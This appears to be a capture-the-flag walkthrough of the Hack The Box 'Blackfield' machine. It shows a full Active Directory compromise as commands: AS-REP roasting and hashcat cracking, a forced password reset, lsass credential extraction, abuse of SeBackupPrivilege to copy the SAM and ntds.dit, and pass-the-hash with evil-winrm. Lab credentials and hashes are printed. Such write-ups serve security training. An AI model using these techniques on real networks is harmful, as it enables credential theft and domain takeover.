---
icon: windows
---

# Blackfield - Hard

<figure><img src="../../.gitbook/assets/image (1749).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/blackfield"><strong>Blackfield</strong></a></p></figcaption></figure>

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
#Nmap TCP
nmap -A -T4 -p- -Pn 10.10.10.192 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-16 19:00 EDT
Nmap scan report for blackfield.local (10.10.10.192)
Host is up (0.071s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-17 06:02:55Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-09-17T06:03:08
|_  start_date: N/A
|_clock-skew: 7h00m00s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   43.34 ms  10.10.16.1
2   104.81 ms blackfield.local (10.10.10.192)
```

The ldap scan shows the Domain name of blacfield.local. I'll add it to my /etc/hosts/ file

```
10.10.10.192	blackfield.local
```

### <mark style="color:$primary;">DNS Enumeration</mark>

I'll try and brute force subdomains using dnsenum to see if anything else shows up.

```
dnsenum --dnsserver 10.10.10.192 -f ~/tools/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt blackfield.local
```

<figure><img src="../../.gitbook/assets/image (1846).png" alt=""><figcaption></figcaption></figure>

Thanks to this we know that his machine is also the DC (Domain Controller) let's add it to our /etc/hosts file

```
10.10.10.192	blackfield.local dc01.blackfield.local
```

### <mark style="color:$primary;">SMB Anonymous access</mark>

```
netexec smb 10.10.10.192 -u guest -p '' --shares
```

<figure><img src="../../.gitbook/assets/image (1847).png" alt=""><figcaption></figcaption></figure>

We should definitely check out the profiles$ share.

```
smbclient -N \\\\10.10.10.192\\profiles$ 
```

<figure><img src="../../.gitbook/assets/image (1848).png" alt=""><figcaption></figcaption></figure>

This is basically a list of usernames, I'll download the folders to my machine and use some BASH FU to save the names to a file.

<figure><img src="../../.gitbook/assets/image (1849).png" alt=""><figcaption></figcaption></figure>

Let's save all these usernames to a file.

```
ls | tee users.txt
```

I am going to use this list to check for valid usernames using [**kerbrute**](https://github.com/ropnop/kerbrute/releases)

### <mark style="color:$primary;">Validating usernames with Kerbrute</mark>

```
kerbrute userenum users.txt --dc dc01.blackfield.local -d blackfield.local
```

<figure><img src="../../.gitbook/assets/image (1850).png" alt=""><figcaption></figcaption></figure>

Now that we got 3 valid usernames I am going to save them to a file called valid\_users.txt and check them for AS-REP roasting, see if we can leak the users hash

<figure><img src="../../.gitbook/assets/image (1851).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">AS-REP Roasting</mark>

<figure><img src="../../.gitbook/assets/image (1852).png" alt=""><figcaption></figcaption></figure>

We managed to get the support users hash let's try and crack it using hashcat

```
hashcat -m 18200 hashes.aspreroast /usr/share/wordlists/rockyou.txt --force
```

```
hashcat -m 18200 hashes.aspreroast /usr/share/wordlists/rockyou.txt --show
```

<figure><img src="../../.gitbook/assets/image (1853).png" alt=""><figcaption></figcaption></figure>

Nice, now we have some credentials we can work with.

```
support:#00^BlackKnight
```

<figure><img src="../../.gitbook/assets/image (1854).png" alt=""><figcaption></figcaption></figure>

With access to ldap, I am going to use netexec to do bloodhound collection

### <mark style="color:$primary;">Bloodhound</mark>

<figure><img src="../../.gitbook/assets/image (1855).png" alt=""><figcaption></figcaption></figure>

Let's start bloodhound and take a look.

```
sudo neo4j start
bloodhound
```

<figure><img src="../../.gitbook/assets/image (1856).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1857).png" alt=""><figcaption></figcaption></figure>

The support user has forceChangePassword on audit2020. I am going to change his password using `rpcclient`

```
rpcclient -U "support%#00^BlackKnight" 10.10.10.192
```

```
setuserinfo2 audit2020 23 'Password123!'
```

<figure><img src="../../.gitbook/assets/image (1858).png" alt=""><figcaption></figcaption></figure>

Let's test these credentials

<figure><img src="../../.gitbook/assets/image (1859).png" alt=""><figcaption></figcaption></figure>

Nice, now we got access to the forensic share, let's check it out

### <mark style="color:$primary;">SMB Enumeration as audit2020</mark>

```
smbclient \\\\10.10.10.192\\forensic -U 'audit2020%Password123!'
```

<figure><img src="../../.gitbook/assets/image (1860).png" alt=""><figcaption></figcaption></figure>

Goodies!!! This appears to be the results of an investigation

<figure><img src="../../.gitbook/assets/image (1861).png" alt=""><figcaption></figcaption></figure>

There’s an extra account Ipwn3dYourCompany, in `domain_admins.txt`:

<figure><img src="../../.gitbook/assets/image (1862).png" alt=""><figcaption></figcaption></figure>

`memory_analysis` is the most interesting:

<figure><img src="../../.gitbook/assets/image (1863).png" alt=""><figcaption></figcaption></figure>

It’s a series of Zip archives, and inside each is a memory dump file.

Immediately I’m drawn to `lsass.zip`. I’ll unzip `lsass.zip` and it gives a 137MB Mini Dump, which is the memory from the process at the time of capture:

### <mark style="color:$primary;">Dumping lsass using pypykatz</mark>

<figure><img src="../../.gitbook/assets/image (1864).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1865).png" alt=""><figcaption></figcaption></figure>

I could move this over to a Windows VM, but there’s a Mimikatz alternative, [pypykatz](https://github.com/skelsec/pypykatz) which will work just fine

```
pypykatz lsa minidump lsass.DMP
```

There are a lot of different logon sessions in the data. The first one has the most useful bit of information, the NT hash for svc\_backup.

<figure><img src="../../.gitbook/assets/image (1866).png" alt=""><figcaption></figcaption></figure>

```
svc_backup:9658d1d1dcd9250115e2205d9f48400d
```

```
netexec winrm 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```

<figure><img src="../../.gitbook/assets/image (1867).png" alt=""><figcaption></figcaption></figure>

And we got winrm access with this account let's get a shell

<figure><img src="../../.gitbook/assets/image (1868).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privelege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (1869).png" alt=""><figcaption></figcaption></figure>

`SeBackUpPrivilege` basically allows for full system read. This is because svc\_backup is in the Backup Operators group:

### <mark style="color:$primary;">Exploiting SeBackUpPrivilege to dump the SAM</mark>

I am going to dump the SYSTEM and the SAM and download them to my machine.

```
reg save hklm\sam SAM
reg save hklm\system SYSTEM
download SAM
download SYSTEM
```

<figure><img src="../../.gitbook/assets/image (1870).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Dumping the SAM</mark>

```
impacket-secretsdump -system SYSTEM -sam SAM local
```

<figure><img src="../../.gitbook/assets/image (1871).png" alt=""><figcaption></figcaption></figure>

There we have them, note that these are the Local _not_ Domain users, however if we can get on as Administrator, it does not matter. We will have access to everything we need.

Let’s try to pass the hash to Evil-winRM and get on the machine as administrator.

<figure><img src="../../.gitbook/assets/image (1872).png" alt=""><figcaption></figcaption></figure>

These admin credentials do not seem to work, i'll try dumping ntds.dit

### <mark style="color:$primary;">Exploiting SeBackupPrivilege to dump ntds.dit</mark>

I will try using a different technique that relies on built-in windows tools ([diskshadow](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) and [robocopy](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)). This is called [living-off the land](https://lolbas-project.github.io/).

First I Create a distributed file shell (dsh) and enter the following commands&#x20;

```
set context persistent nowriters
add volume c: alias blackfield
create
expose %blackfield% z:
```

<figure><img src="../../.gitbook/assets/image (1873).png" alt=""><figcaption></figcaption></figure>

Second step I will Convert the dsh file into a file compatible with the Windows Machine&#x20;

```
unix2dos blackfield.dsh
```

<figure><img src="../../.gitbook/assets/image (1874).png" alt=""><figcaption></figcaption></figure>

Third step I will Copy the distributed file shell to the target machine

<figure><img src="../../.gitbook/assets/image (1875).png" alt=""><figcaption></figcaption></figure>

Now I can use diskshadow with the dsh file to create a a shadow copy (backup) of the C:\ drive.

```
diskshadow /s blackfield.dsh
```

<figure><img src="../../.gitbook/assets/image (1876).png" alt=""><figcaption></figcaption></figure>

After that, I used robocopy to extract the ntds.dit database from the the backup generated by diskshadow

```
robocopy /b z:/windows/ntds . ntds.dit
```

<figure><img src="../../.gitbook/assets/image (1877).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1879).png" alt=""><figcaption></figcaption></figure>

I have already extracted the sam from the registry, here is the command if you didn't

```
reg save hklm\system SYSTEM
```

now I'll transfer the ntds.dit and system files to our attacker machine

<figure><img src="../../.gitbook/assets/image (1878).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Dumping ntds.dit</mark>

```
impacket-secretsdump -ntds ntds.dit -system SYSTEM
```

<figure><img src="../../.gitbook/assets/image (1880).png" alt=""><figcaption></figcaption></figure>

```
Administrator:184fb5e5178480be64824d4cd53b99ee
```

```
evil-winrm -i 10.10.10.192 -u Administrator -H 184fb5e5178480be64824d4cd53b99ee
```

<figure><img src="../../.gitbook/assets/image (1881).png" alt=""><figcaption></figcaption></figure>

And this hash worked we are now admin!
